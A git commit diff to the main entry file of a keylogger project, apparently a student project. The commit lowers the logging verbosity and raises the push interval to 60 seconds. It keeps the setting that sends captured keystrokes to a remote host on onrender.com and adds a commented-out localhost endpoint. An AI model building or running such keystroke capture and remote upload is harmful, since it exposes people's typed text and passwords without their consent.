6769b247cf66aa422e0cfc441c5dfa4f34f59add
a5r0n <a5r0n@users.noreply.github.com>
2025-02-26 20:07:26 +0200

    fix(keylogger): Update logging level to INFO and increase push interval to 60 seconds

--- keylogger/__main__.py
+++ keylogger/__main__.py
@@ -5,11 +5,13 @@ logger = logging.getLogger(__name__)
 
 if __name__ == "__main__":
     logging.basicConfig(
-        level=logging.DEBUG,
+        level=logging.INFO,
         format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
     )
 
     manager(
         endpoint="https://loggerstudentproject.onrender.com",
-        push_interval=10,
+        # endpoint="http://localhost:5000",
+        # log_path="keylogger.log",
+        push_interval=60,
     ).run()
